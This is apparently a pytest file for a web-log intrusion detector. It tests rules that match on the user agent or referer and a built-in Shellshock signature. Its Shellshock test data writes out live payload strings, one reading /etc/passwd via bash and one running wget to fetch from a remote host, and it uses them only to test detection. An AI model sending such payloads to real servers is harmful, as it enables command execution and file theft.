"""Rules can read the user agent or the referer as well as the request target."""

import time
from datetime import datetime, timezone

import pytest

from loginsight.detection import RuleSet, Severity, detect, load_rules
from loginsight.detection.models import FIELDS, SignatureRule
from loginsight.detection.ruleset import RulesError, parse_rules
from loginsight.detection.signatures import detect_signatures
from loginsight.parsing.models import LogEntry

WHEN = datetime(2026, 10, 10, 10, 0, 0, tzinfo=timezone.utc)
SHELLSHOCK = "() { :;}; /bin/bash -c 'cat /etc/passwd'"

RULE = """
[[signature]]
id = "{id}"
label = "command_injection"
severity = "critical"
description = "a rule that reads another field"
pattern = '''evil'''
{extra}
"""


def entry(target="/", user_agent=None, referer=None):
    path, _, query = target.partition("?")
    return LogEntry(
        ip="203.0.113.7",
        time=WHEN,
        method="GET",
        path=path,
        query=query,
        protocol="HTTP/1.1",
        status=200,
        size=0,
        referer=referer,
        user_agent=user_agent,
        request=f"GET {target} HTTP/1.1",
    )


DEFAULT = object()


def rule(field=DEFAULT, rule_id="evil-rule"):
    options = {} if field is DEFAULT else {"field": field}
    return SignatureRule(
        id=rule_id,
        label="command_injection",
        severity=Severity.HIGH,
        description="a made-up rule",
        pattern="evil",
        **options,
    )


class TestTheRuleModel:
    def test_the_known_fields(self):
        assert FIELDS == ("target", "user_agent", "referer")

    def test_the_default_is_the_request_target(self):
        assert rule().field == "target"

    @pytest.mark.parametrize("field", FIELDS)
    def test_each_field_is_accepted(self, field):
        assert rule(field).field == field

    @pytest.mark.parametrize("bad", ["", "path", "User_Agent", "header", None, 3])
    def test_anything_else_is_refused_and_the_rule_is_named(self, bad):
        with pytest.raises(ValueError, match="evil-rule.*field"):
            rule(bad)


class TestTheRulesFile:
    def test_a_rule_without_the_key_reads_the_target(self):
        rules = parse_rules(RULE.format(id="plain-rule", extra=""))
        assert rules.signatures[0].field == "target"

    @pytest.mark.parametrize("field", FIELDS)
    def test_each_field_can_be_chosen(self, field):
        rules = parse_rules(RULE.format(id="chosen-rule", extra=f'field = "{field}"'))
        assert rules.signatures[0].field == field

    def test_an_unknown_field_is_reported_with_the_choices(self):
        with pytest.raises(RulesError) as raised:
            parse_rules(RULE.format(id="bad-rule", extra='field = "cookie"'), source="r.toml")
        message = str(raised.value)
        assert "signature 'bad-rule'" in message and "'cookie'" in message
        assert "target, user_agent, referer" in message

    def test_a_field_that_is_not_text_is_reported(self):
        with pytest.raises(RulesError, match="field must be text"):
            parse_rules(RULE.format(id="bad-rule", extra="field = 3"))

    def test_an_empty_field_is_reported(self):
        with pytest.raises(RulesError, match="field"):
            parse_rules(RULE.format(id="bad-rule", extra='field = ""'))

    def test_other_unknown_keys_are_still_refused(self):
        with pytest.raises(RulesError, match="unknown key"):
            parse_rules(RULE.format(id="bad-rule", extra='where = "user_agent"'))


class TestTheEngine:
    def test_a_user_agent_rule_reads_only_the_user_agent(self):
        rules = [rule("user_agent")]
        assert detect_signatures([entry("/evil", user_agent="Mozilla")], rules) == []
        assert detect_signatures([entry("/", referer="evil")], rules) == []
        (found,) = detect_signatures([entry("/", user_agent="an EVIL bot")], rules)
        assert found.rule_id == "evil-rule" and found.first_index == 0

    def test_a_referer_rule_reads_only_the_referer(self):
        rules = [rule("referer")]
        assert detect_signatures([entry("/evil", user_agent="evil")], rules) == []
        assert len(detect_signatures([entry("/", referer="http://evil.example/")], rules)) == 1

    def test_a_target_rule_ignores_the_other_fields(self):
        rules = [rule("target")]
        assert detect_signatures([entry("/", user_agent="evil", referer="evil")], rules) == []
        assert len(detect_signatures([entry("/evil")], rules)) == 1

    def test_a_missing_user_agent_or_referer_never_matches(self):
        rules = [rule("user_agent", "ua-rule"), rule("referer", "ref-rule")]
        assert detect_signatures([entry("/", user_agent=None, referer=None)], rules) == []

    def test_the_evidence_names_the_field_and_shows_the_value(self):
        (found,) = detect_signatures([entry("/", user_agent="evil agent")], [rule("user_agent")])
        assert found.evidence == "user agent: evil agent"
        (found,) = detect_signatures([entry("/", referer="http://evil/")], [rule("referer")])
        assert found.evidence == "referer: http://evil/"
        (found,) = detect_signatures([entry("/evil")], [rule("target")])
        assert found.evidence == "GET /evil HTTP/1.1"

    def test_a_long_value_is_cut_in_the_evidence(self):
        (found,) = detect_signatures(
            [entry("/", user_agent="evil" + "x" * 5000)], [rule("user_agent")]
        )
        assert len(found.evidence) == 200

    def test_the_value_is_decoded_like_a_target_before_matching(self):
        rules = [rule("user_agent")]
        assert len(detect_signatures([entry("/", user_agent="%65vil")], rules)) == 1
        assert len(detect_signatures([entry("/", user_agent="EvIl")], rules)) == 1

    def test_rules_of_different_fields_fire_independently_on_one_request(self):
        rules = [rule("target", "t-rule"), rule("user_agent", "ua-rule"), rule("referer", "r-rule")]
        found = detect_signatures([entry("/evil", user_agent="evil", referer="evil")], rules)
        assert [d.rule_id for d in found] == ["t-rule", "ua-rule", "r-rule"]

    def test_the_order_is_by_request_then_rule_order(self):
        rules = [rule("user_agent", "ua-rule"), rule("target", "t-rule")]
        found = detect_signatures([entry("/evil", user_agent="evil"), entry("/evil")], rules)
        assert [(d.first_index, d.rule_id) for d in found] == [
            (0, "ua-rule"),
            (0, "t-rule"),
            (1, "t-rule"),
        ]

    def test_the_whole_pipeline_merges_two_rules_on_one_request(self):
        rules = RuleSet(signatures=(rule("target", "t-rule"), rule("user_agent", "ua-rule")))
        (found,) = detect([entry("/evil", user_agent="evil")], rules)
        assert found.also_matched in (("ua-rule",), ("t-rule",))

    def test_a_value_is_normalised_once_however_many_rules_read_it(self, monkeypatch):
        from loginsight.detection import signatures

        calls = []
        real = signatures.normalise
        monkeypatch.setattr(signatures, "normalise", lambda text: calls.append(text) or real(text))
        rules = [
            rule("user_agent", "a-rule"),
            rule("user_agent", "b-rule"),
            rule("user_agent", "c-rule"),
        ]
        detect_signatures([entry("/x", user_agent="evil")], rules)
        assert calls == ["evil"]

    def test_a_field_a_request_lacks_is_looked_up_once_too(self, monkeypatch):
        from loginsight.detection import signatures

        calls = []
        real = signatures._value
        monkeypatch.setattr(signatures, "_value", lambda e, f: calls.append(f) or real(e, f))
        rules = [rule("referer", "a-rule"), rule("referer", "b-rule"), rule("target", "c-rule")]
        detect_signatures([entry("/x")], rules)
        assert calls == ["referer", "target"]

    def test_a_rule_set_with_only_target_rules_behaves_as_before(self):
        entries = [entry("/a?q=evil"), entry("/b", user_agent="evil")]
        assert [d.first_index for d in detect_signatures(entries, [rule()])] == [0]


class TestShellshock:
    RULES = {r.id: r for r in load_rules().signatures}

    def test_the_rule_exists_and_reads_the_user_agent(self):
        shellshock = self.RULES["cmdi-shellshock"]
        assert (shellshock.field, shellshock.label) == ("user_agent", "command_injection")
        assert shellshock.severity is Severity.CRITICAL

    @pytest.mark.parametrize(
        "agent",
        [
            SHELLSHOCK,
            "() { _; } >_[$($())] { echo vulnerable; }; id",
            "() {:;}; wget http://203.0.113.9/x",
            "(){ :;}; /bin/id",
            "Mozilla/5.0 () { test;};echo",
        ],
    )
    def test_it_catches_the_attack(self, agent):
        found = detect([entry("/cgi-bin/test.sh", user_agent=agent)])
        assert [d.rule_id for d in found if d.label == "command_injection"] == ["cmdi-shellshock"]

    @pytest.mark.parametrize(
        "agent",
        [
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120",
            "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
            "curl/8.0",
            "() ",
            "{ :;};",
            "my-app (build {17}); linux",
            "my-app () {build} v2",
            "",
        ],
    )
    def test_it_leaves_ordinary_agents_alone(self, agent):
        assert detect([entry("/", user_agent=agent or None)]) == []

    def test_it_does_not_fire_on_the_same_text_in_the_path(self):
        assert detect([entry("/?x=" + SHELLSHOCK)]) == [] or all(
            d.rule_id != "cmdi-shellshock" for d in detect([entry("/?x=" + SHELLSHOCK)])
        )

    def test_the_evidence_shows_the_user_agent(self):
        (found,) = detect([entry("/", user_agent=SHELLSHOCK)])
        assert found.evidence == "user agent: " + SHELLSHOCK

    def test_hostile_user_agents_are_matched_quickly(self):
        for agent in (
            "() {" * 700,
            "() { " + ";" * 3000,
            "(" * 3000,
            "{" * 3000,
            "() {" + "}" * 2000,
        ):
            started = time.process_time()
            detect([entry("/", user_agent=agent)] * 50)
            assert time.process_time() - started < 1.0
